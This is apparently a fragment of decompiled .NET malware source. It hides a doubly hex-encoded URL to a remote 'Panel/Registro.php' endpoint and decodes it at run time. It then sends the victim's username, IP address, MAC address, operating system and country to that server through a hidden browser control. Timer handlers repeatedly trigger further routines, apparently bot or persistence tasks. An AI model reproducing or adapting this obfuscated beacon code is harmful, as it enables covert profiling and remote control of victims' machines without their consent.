      string uriString = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(this.Desencriptar(RuntimeHelpers.GetObjectValue(this.Desencriptar((object) "363837343734373033413246324637373737373732453633364336313733363936363639363336313634364637333245363836453246353036313645363536433246353236353637363937333734373236463245373036383730334635353533343535323344"))), (object) this.NombreUsu), (object) "&IP="), (object) this.IPx), (object) "&MAC="), (object) this.Mac), (object) "&SO="), (object) this.WinSO), (object) "&PAIS="), (object) this.PaisSO));
      try
      {
        this.WebBrowser1.Url = new Uri(uriString, UriKind.RelativeOrAbsolute);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return Conversions.ToString(true);
    }

    private string ConvToHex(int x) => x <= 9 ? Conversions.ToString(x) : Conversions.ToString(Strings.Chr(checked (x + 55)));

    private int ConvToInt(string x)
    {
      string str1 = Strings.Mid(x, 1, 1);
      string str2 = Strings.Mid(x, 2, 1);
      int Left = !Versioned.IsNumeric((object) str1) ? checked (Strings.Asc(str1) - 55 * 16) : Conversions.ToInteger(Operators.MultiplyObject((object) 16, Conversion.Int((object) str1)));
      return !Versioned.IsNumeric((object) str2) ? checked (Left + Strings.Asc(str2) - 55) : Conversions.ToInteger(Operators.AddObject((object) Left, Conversion.Int((object) str2)));
    }

    public object Desencriptar(object DataValue)
    {
      long num = (long) Strings.Len(RuntimeHelpers.GetObjectValue(DataValue));
      long Start = 1;
      string str;
      while (Start <= num)
      {
        string x = Strings.Mid(Conversions.ToString(DataValue), checked ((int) Start), 2);
        str += Conversions.ToString(Strings.Chr(this.ConvToInt(x)));
        checked { Start += 2L; }
      }
      return (object) str;
    }

    private void Timer1_Timer(object sender, EventArgs e)
    {
      checked { ++this.I; }
      this.Tiempo = Strings.Format((object) (Conversion.Int((double) this.I / 36000.0) % 24.0), "00") + ":" + Strings.Format((object) (Conversion.Int((double) this.I / 600.0) % 60.0), "00") + ":" + Strings.Format((object) (Conversion.Int((double) this.I / 10.0) % 60.0), "00") + ":" + Strings.Format((object) (this.I % 10L), "00");
      this.Label3.Text = this.Tiempo;
      if (Operators.CompareString(Strings.Format((object) (Conversion.Int((double) this.I / 600.0) % 60.0), "00"), Strings.Format((object) (Conversion.Int(1.0) % 60.0), "00"), false) != 0)
        return;
      this.I = 0L;
      this.Timer1.Interval = 1;
      this.RunStart();
      this.CoP();
      this.RegTar();
      this.FXR();
      this.SWS();
    }

    private void Timer2_Timer(object sender, EventArgs e)
    {
      checked { ++this.R; }
      this.Time = Strings.Format((object) (Conversion.Int((double) this.R / 36000.0) % 24.0), "00") + ":" + Strings.Format((object) (Conversion.Int((double) this.R / 600.0) % 60.0), "00") + ":" + Strings.Format((object) (Conversion.Int((double) this.R / 10.0) % 60.0), "00") + ":" + Strings.Format((object) (this.R % 10L), "00");
      this.Label4.Text = this.Time;
      if (Operators.CompareString(Strings.Format((object) (Conversion.Int((double) this.R / 600.0) % 60.0), "00"), Strings.Format((object) (Conversion.Int(2.0) % 60.0), "00"), false) != 0)
        return;
      this.R = 0L;
      this.Timer2.Interval = 1;
      this.GO();
    }
  }
}
